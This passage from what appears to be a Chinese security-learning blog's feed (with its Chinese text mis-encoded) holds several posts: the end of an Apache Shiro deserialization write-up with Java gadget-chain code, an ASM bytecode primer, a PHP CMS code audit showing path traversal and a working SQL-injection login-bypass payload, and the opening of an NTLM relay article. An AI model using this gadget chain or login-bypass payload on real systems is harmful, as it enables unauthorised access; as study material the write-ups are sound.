c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//å…ˆä¼ ä¸€ä¸ªæ²¡ç”¨ä¸œè¥¿é˜»æ–­é“¾å­æ‰§è¡Œ</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//è¿™é‡Œçš„sizeè¦æ»¡è¶³è¦æ±‚æ‰èƒ½è§¦å‘è°ƒç”¨é“¾æ‰§è¡Œï¼Œè¿™é‡Œéœ€è¦æ”¹ç”¨æ·»åŠ å…ƒç´ æ‰è¡Œï¼Œå› ä¸ºæˆ‘ä»¬çš„templatesè¿˜æ²¡æœ‰åŠ å…¥è¿›å»</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//ç„¶ååå°„ä¿®æ”¹å›æ¥priorityQueueçš„å€¼</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†æ¯”è¾ƒæ‡’çš„æ”¹æ³•ï¼Œç›´æ¥å€Ÿç”¨äº†ä¸€ä¸‹cc4è¿™ä¸ªç±»ï¼Œä¸»è¦æ˜¯ä¸ºäº†åºåˆ—åŒ–èƒ½æˆåŠŸï¼Œæœ¬åœ°æµ‹è¯•æ— æ‰€è°“ï¼Œå…¶ä»–æ”¹æ³•è°ƒäº†åŠå¤©éƒ½æŠ¥é”™æ‡’å¾—è°ƒäº†ã€‚ã€‚ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151444253.png" alt="image-20240615103205401"></p><p><strong>æ‰“ä¸€ä¸‹shiroçœ‹çœ‹æ•ˆæœ</strong></p><p><img src="http://cdn.clown2024.cn/202407151444254.png" alt="image-20240615103608867"></p><p>å¯ä»¥æˆåŠŸæ‰“é€š</p><blockquote><p>æ³¨æ„è¿™é‡Œå¦‚æœç”¨ysoserialç”Ÿæˆçš„payloadæ‰“æ˜¯æ‰“ä¸é€šçš„ï¼Œå› ä¸ºä»–çš„CBç‰ˆæœ¬å’Œshiroçš„ä¸ä¸€æ ·</p><p>è¿™é‡Œç”¨çš„å®˜æ–¹ç¯å¢ƒæ²¡æœ‰åˆ æ‰<strong>JSESSIONID</strong>ç«Ÿç„¶ä¹Ÿé€šäº†ï¼ˆ</p></blockquote><h3><span id="cbé“¾è°ƒç”¨å›¾">CBé“¾è°ƒç”¨å›¾</span></h3><p><img src="http://cdn.clown2024.cn/202407151444255.png" alt="image-20240615001956606"></p><h1><span id="shiro721">Shiro721</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;shiroä»‹ç»&quot;&gt;Shiroä»‹ç»&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;ç›´æ¥é—®kimiç»™å‡ºçš„å¤§è‡´ä»‹ç»&lt;/p&gt;
&lt;p&gt;Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚å®ƒè¢«è®¾è®¡ä¸ºæ˜“äºç†è§£ä¸”æ˜“äºä½¿ç”¨ï¼ŒåŒæ—¶æä¾›äº†å¼º</summary>
      
    
    
    
    <category term="javaæ¼æ´" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="javaååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ASMå­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-06-10T13:39:52.000Z</published>
    <updated>2024-06-15T16:29:39.540Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å­¦ä¹ ä¸€ä¸‹javaçš„ASMï¼Œå’Œclasså­—èŠ‚ç ä»¥åŠä¸€äº›ç®€å•çš„jvmçŸ¥è¯†ä¹Ÿè®°å½•åœ¨è¿™ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.javabetter.cn/jvm/class-file-jiegou.html">https://lsieun.github.io/java/asm/java-asm-season-01.htmlï¼Œhttps://www.javabetter.cn/jvm/class-file-jiegou.html</a></p><p>å› ä¸ºåé¢javaååºåˆ—åŒ–çš„å­¦ä¹ è¿˜éœ€è¦åŠ¨æ€ç”Ÿæˆæ¶æ„å­—èŠ‚ç ï¼Œæ‰€ä»¥æ¥è¡¥è¡¥åŸºç¡€ã€‚</p><h1><span id="javaç±»æ–‡ä»¶ç»“æ„">Javaç±»æ–‡ä»¶ç»“æ„</span></h1><h1><span id="asmä»‹ç»">ASMä»‹ç»</span></h1><p>ASMå°±æ˜¯ä¸€ä¸ªæ“ä½œjavaå­—èŠ‚ç çš„ç±»åº“ã€‚</p><p>ASMçš„æ“ä½œå¯¹è±¡å­—èŠ‚ç æ•°æ®ï¼Œå°±æ˜¯.javaæ–‡ä»¶ç»è¿‡javacä¹‹åç”Ÿæˆçš„.classæ–‡ä»¶ã€‚</p><p>ASMå¤„ç†å­—èŠ‚ç çš„æ­¥éª¤å°±æ˜¯ï¼šæ‹†åˆ†-&gt;ä¿®æ”¹-&gt;åˆå¹¶</p><ul><li>ç¬¬ä¸€æ­¥ï¼Œå°† <code>.class</code> æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼›</li><li>ç¬¬äºŒæ­¥ï¼Œå¯¹æŸä¸€ä¸ªéƒ¨åˆ†çš„ä¿¡æ¯è¿›è¡Œä¿®æ”¹ï¼›</li><li>ç¬¬ä¸‰æ­¥ï¼Œå°†å¤šä¸ªéƒ¨åˆ†é‡æ–°ç»„ç»‡æˆä¸€ä¸ªæ–°çš„ <code>.class</code> æ–‡ä»¶ã€‚</li></ul><h2><span id="ç‰ˆæœ¬é—®é¢˜">ç‰ˆæœ¬é—®é¢˜</span></h2><p>ä¸åŒçš„ASMç‰ˆæœ¬å¯¹åº”ä¸åŒçš„Javaç‰ˆæœ¬ï¼Œé«˜ç‰ˆæœ¬å¯ä»¥å…¼å®¹ä½ç‰ˆæœ¬</p><table><thead><tr><th>ASM Release</th><th>Release Date</th><th>Java Support</th></tr></thead><tbody><tr><td>2.0</td><td>2005-05-17</td><td>Java 5 language support</td></tr><tr><td>3.2</td><td>2009-06-11</td><td>support for the new <code>invokedynamic</code> code.</td></tr><tr><td>4.0</td><td>2011-10-29</td><td>Java 7 language support</td></tr><tr><td>5.0</td><td>2014-03-16</td><td><strong>Java 8 language support</strong></td></tr><tr><td>6.0</td><td>2017-09-23</td><td>Java 9 language support</td></tr><tr><td>6.1</td><td>2018-03-11</td><td>Java 10 language support</td></tr><tr><td>7.0</td><td>2018-10-27</td><td><strong>Java 11 language support</strong></td></tr><tr><td>7.1</td><td>2019-03-03</td><td>Java 13 language support</td></tr><tr><td>8.0</td><td>2020-03-28</td><td>Java 14 language support</td></tr><tr><td>9.0</td><td>2020-09-22</td><td>Java 16 language support</td></tr><tr><td>9.1</td><td>2021-02-06</td><td><strong>JDK 17 support</strong></td></tr><tr><td>9.2</td><td>2021-06-26</td><td>JDK 18 support</td></tr><tr><td>9.3</td><td>2022-04-04</td><td></td></tr><tr><td>9.4</td><td>2022-10-02</td><td></td></tr><tr><td>9.5</td><td>2023-03-24</td><td></td></tr></tbody></table><h2><span id="asmèƒ½åšçš„äº‹">ASMèƒ½åšçš„äº‹</span></h2><ul><li>çˆ¶ç±»ï¼šä¿®æ”¹æˆä¸€ä¸ªæ–°çš„çˆ¶ç±»</li><li>æ¥å£ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ¥å£ã€åˆ é™¤å·²æœ‰çš„æ¥å£</li><li>å­—æ®µï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„å­—æ®µã€åˆ é™¤å·²æœ‰çš„å­—æ®µ</li><li>æ–¹æ³•ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€åˆ é™¤å·²æœ‰çš„æ–¹æ³•ã€ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•</li><li>â€¦ç­‰ç­‰</li></ul><h1><span id="asmç”Ÿæˆæ–°çš„ç±»">ASMç”Ÿæˆæ–°çš„ç±»</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥å­¦ä¹ ä¸€ä¸‹javaçš„ASMï¼Œå’Œclasså­—èŠ‚ç ä»¥åŠä¸€äº›ç®€å•çš„jvmçŸ¥è¯†ä¹Ÿè®°å½•åœ¨è¿™ï¼Œå‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.java</summary>
      
    
    
    
    <category term="javaåŸºç¡€" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ç†Šæµ·cmsä»£ç å®¡è®¡</title>
    <link href="https://clowsman.github.io/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://clowsman.github.io/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-05-20T16:11:05.000Z</published>
    <updated>2024-07-15T09:12:47.247Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ç¯å¢ƒå®‰è£…">ç¯å¢ƒå®‰è£…</span></h1><p>æ¥å®¡ä¸€ä¸‹è¿™ä¸ªç®€å•cmså­¦ä¹ ä¸€ä¸‹ï¼Œç†Šæµ·cmsç›´æ¥ç½‘ä¸Šæ‰¾å°±å¯ä»¥</p><p>é‡‡ç”¨phpstudyè¿›è¡Œé…ç½®ï¼Œç„¶åè¦æå‰å»ºç«‹ä¸€ä¸ªæ•°æ®ï¼Œä»–ä¸ä¼šè‡ªåŠ¨å¸®ä½ å»º</p><p>å®‰è£…å¥½åé¦–é¡µå°±æ˜¯è¿™æ ·çš„</p><p><img src="http://cdn.clown2024.cn/202407151712203.png" alt="image-20240521001351083"></p><h1><span id="å¼€å§‹å®¡è®¡">å¼€å§‹å®¡è®¡</span></h1><h2><span id="ç›®å½•ç»“æ„">ç›®å½•ç»“æ„</span></h2><p><img src="http://cdn.clown2024.cn/202407151712204.png" alt="image-20240523235111948"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">admin         --ç®¡ç†åå°æ–‡ä»¶å¤¹<br>css           --å­˜æ”¾cssçš„æ–‡ä»¶å¤¹<br>files         --å­˜æ”¾é¡µé¢çš„æ–‡ä»¶å¤¹<br>images        --å­˜æ”¾å›¾ç‰‡çš„æ–‡ä»¶å¤¹<br>inc           --å­˜æ”¾ç½‘ç«™é…ç½®æ–‡ä»¶çš„æ–‡ä»¶å¤¹<br>install       --ç½‘ç«™è¿›è¡Œå®‰è£…çš„æ–‡ä»¶å¤¹<br>seacmseditor  --ç¼–è¾‘å™¨æ–‡ä»¶å¤¹<br>template      --æ¨¡æ¿æ–‡ä»¶å¤¹<br>upload        --ä¸Šä¼ åŠŸèƒ½æ–‡ä»¶å¤¹<br>index.php     --ç½‘ç«™é¦–é¡µ<br></code></pre></td></tr></table></figure><p>å…ˆç›´æ¥æ”¾è¿›seayé‡Œé¢æ‰«ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151712205.png" alt="image-20240523235351518"></p><p>çœ‹èµ·æ¥è¿˜è›®å°‘çš„ï¼Œé‚£å°±ç›´æ¥é’ˆå¯¹æ¯ä¸ªæ¼æ´ç±»å‹å»çœ‹çœ‹</p><h2><span id="æ–‡ä»¶åŒ…å«æ¼æ´">æ–‡ä»¶åŒ…å«æ¼æ´</span></h2><p><strong>ç¬¬ä¸€å¤„æ–‡ä»¶åŒ…å«</strong></p><p>æ ¹ç›®å½•ä¸‹çš„index.phpæºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//å•ä¸€å…¥å£æ¨¡å¼</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//æ¥æ”¶æ–‡ä»¶å</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œæˆ‘åœ¨ç½‘ç«™ä¸Šçº§ç›®å½•æ”¾äº†flag.phpç”¨æ¥æµ‹è¯•ï¼Œrä¸ºç©ºå°±ä¼šåŒ…å«filesç›®å½•ä¸‹çš„indexï¼Œç»™rä¼ ä¸€ä¸ª..&#x2F;..&#x2F;flagå³å¯ç›®å½•ç©¿è¶Š</p><p><img src="http://cdn.clown2024.cn/202407151712206.png" alt="image-20240524000419879"></p><p>èƒ½é…åˆæ–‡ä»¶ä¸Šä¼ å°±èƒ½å¤Ÿå‘æŒ¥å¤§ç”¨å¤„ï¼Œç›®å‰æš‚æ—¶è¯»è¯»æ–‡ä»¶åªèƒ½</p><p>addslashesæ˜¯ç”¨æ¥è½¬ä¹‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„</p><p><img src="http://cdn.clown2024.cn/202407151712207.png" alt="image-20240524000753569"></p><p><strong>ç¬¬äºŒå¤„æ–‡ä»¶åŒ…å«</strong></p><p>ç¬¬äºŒå¤„åœ¨&#x2F;admin&#x2F;index.phpå¤„</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//å•ä¸€å…¥å£æ¨¡å¼</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//æ¥æ”¶æ–‡ä»¶å</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¯¥é¡µé¢é»˜è®¤ä¼šåŠ ä¸Šloginå‚æ•°</p><p><img src="http://cdn.clown2024.cn/202407151712208.png" alt="image-20240524001055974"></p><p>ä¸€æ ·çš„ç›®å½•ç©¿è¶Šæ¼æ´</p><p><img src="http://cdn.clown2024.cn/202407151712209.png" alt="image-20240524001024759"></p><h2><span id="sqlæ³¨å…¥">SQLæ³¨å…¥</span></h2><p>admin&#x2F;filesä¸‹é¢çš„é¡µé¢å°±æŠ¥äº†å¾ˆå¤šsqlçš„æ¼æ´</p><p>ä½†æ˜¯æˆ‘æƒ³å…ˆå»çœ‹ä¸€ä¸‹loginé¡µé¢ï¼Œå› ä¸ºå¾ˆå¤šæ¼æ´éƒ½æ˜¯åå°é¡µé¢ï¼Œç™»é™†éƒ½ç»•è¿‡ä¸è¿‡å»æ€ä¹ˆè¿›åå°åˆ©ç”¨å‘¢ï¼Œè€Œä¸”è¿™ä¸ªcmsåº”è¯¥æ²¡æœ‰é¢„ç¼–è¯‘ä¹ æƒ¯ï¼Œloginé¡µé¢çš„sqlåº”è¯¥ä¹Ÿæ˜¯æœ‰æ¼æ´ï¼Œæˆ‘å°±å»çœ‹äº†ä¸€ä¸‹ï¼Œè¿˜çœŸæœ‰</p><p><strong>admin&#x2F;files&#x2F;login.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../inc/conn.php&#x27;</span>;<br><span class="hljs-variable">$login</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>];<br><span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$checkbox</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checkbox&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$login</span>&lt;&gt;<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-variable">$users</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)) &#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$passwords</span>=<span class="hljs-variable">$users</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)&lt;&gt;<span class="hljs-variable">$passwords</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment">//å†™å…¥ç™»å½•ä¿¡æ¯å¹¶è®°ä½30å¤©</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$checkbox</span>==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;this.location=&#x27;?r=index&#x27;&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è¿™é‡Œæ²¡æœ‰è½¬ä¹‰é‚£å°±è‚¯å®šæœ‰sqlæ³¨å…¥äº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä»–çš„æ ¡éªŒé€»è¾‘ï¼ŒæŸ¥è¯¢æŒ‡å®šç”¨æˆ·ç„¶åä»æ•°æ®åº“ä¸­è·å–ä»–çš„å¯†ç ï¼Œä¸æˆ‘ä»¬çš„å¯†ç md5ä¹‹åè¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰åˆ™ç™»é™†æˆåŠŸ</p><p>é‚£è¿™é‡Œæˆ‘å°±é‡‡ç”¨äº†è”åˆæ³¨å…¥ï¼Œç„¶åè¾“å…¥å¯†ç ä¸º1ï¼ŒæŸ¥è¯¢çš„å€¼ä¸º1çš„md5ï¼Œæœ€ç»ˆæˆåŠŸç»•è¿‡</p><blockquote><p>ä¸è¿‡å­—æ®µæ•°éœ€è¦å°è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œè¯•å‡ºæ¥æ˜¯æœ‰8ä¸ª</p></blockquote><p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user=-1&#x27; union select 1,1,1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;,1,1,1,1#&amp;password=1&amp;checkbox=1&amp;login=yes<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151712210.png" alt="image-20240524003328983"></p><p>è€Œä¸”èº«ä»½ç«Ÿç„¶æ˜¯adminï¼Œè¿™é‡Œè¿˜æ²¡çœ‹å‡ºä¸ºä»€ä¹ˆçªç„¶å°±adminäº†ï¼Œæºç å¥½åƒæ²¡çœ‹åˆ°ç›¸å…³çš„</p><p><img src="http://cdn.clown2024.cn/202407151712211.png" alt="image-20240524003529583"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ç¯å¢ƒå®‰è£…&quot;&gt;ç¯å¢ƒå®‰è£…&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;æ¥å®¡ä¸€ä¸‹è¿™ä¸ªç®€å•cmså­¦ä¹ ä¸€ä¸‹ï¼Œç†Šæµ·cmsç›´æ¥ç½‘ä¸Šæ‰¾å°±å¯ä»¥&lt;/p&gt;
&lt;p&gt;é‡‡ç”¨phpstudyè¿›è¡Œé…ç½®ï¼Œç„¶åè¦æå‰å»ºç«‹ä¸€ä¸ªæ•°æ®ï¼Œä»–ä¸ä¼šè‡ªåŠ¨å¸®ä½ å»º&lt;/p&gt;
&lt;p&gt;å®‰è£…å¥½åé¦–é¡µå°±æ˜¯è¿™æ ·çš„&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://clowsman.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://clowsman.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-NTLMä¸­ç»§ä¸“é¢˜</title>
    <link href="https://clowsman.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/"/>
    <id>https://clowsman.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/</id>
    <published>2024-05-16T15:34:05.000Z</published>
    <updated>2024-07-15T06:47:03.876Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ntlmåè®®">NTLMåè®®</span></h1><p>NTLM(NT LAN Manager)æ˜¯ä¸€å¥— Windows å®‰å…¨åè®®ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›å…·æœ‰å®Œæ•´æ€§å’Œæœºå¯†æ€§çš„èº«ä»½éªŒè¯ã€‚</p><p>NTLM æ˜¯åŸºäºè´¨è¯¢&#x2F;åº”ç­”æ¨¡å¼çš„èº«ä»½éªŒè¯åè®®ï¼Œå…¶è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼ŒéªŒè¯è¿‡ç¨‹ä¸­ä¸ä¼šé€šè¿‡ç½‘ç»œä¼ è¾“ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p><p>NTLMéªŒè¯çš„åŠ å¯†ç®—æ³•ä¸ºNTLM Hashï¼Œç”¨äºç”¨æˆ·æ˜æ–‡å¯†ç çš„åŠ å¯†ï¼Œå…¶è®¡ç®—çš„å“ˆå¸Œå€¼å­˜å‚¨åœ¨æœ¬åœ°çš„SAMæ–‡ä»¶ä¸­ï¼ŒåŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œå€¼å­˜å‚¨åœ¨åŸŸæ§çš„NTDS.ditæ–‡ä»¶ä¸­ã€‚</p><p>æœ¬åœ°ç”¨æˆ·ç™»å½•éªŒè¯æ—¶ï¼Œå°±æ˜¯å°†è¾“å…¥çš„å¯†ç è½¬åŒ–ä¸ºNTLM Hashç„¶åä¸SAMæ–‡ä»¶ä¸­çš„NTLM Hashæ¯”è¾ƒã€‚</p><p>æ–‡ä»¶ä¸­å­˜å‚¨çš„å“ˆå¸Œå€¼æ ¼å¼ç±»ä¼¼å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446349.png" alt="image-20240517104232456"></p><p>ä¸Šå›¾æœ‰ä¸¤ä¸ªå“ˆå¸Œï¼Œç¬¬ä¸€ä¸ªæ˜¯LM Hashï¼Œç¬¬äºŒä¸ªæ˜¯NTLM Hashã€‚</p><p>LM Hash æ˜¯ LM(LAN Manager)éªŒè¯æœºåˆ¶çš„åŠ å¯†ç®—æ³•ã€‚LM æ˜¯åœ¨ NTLM 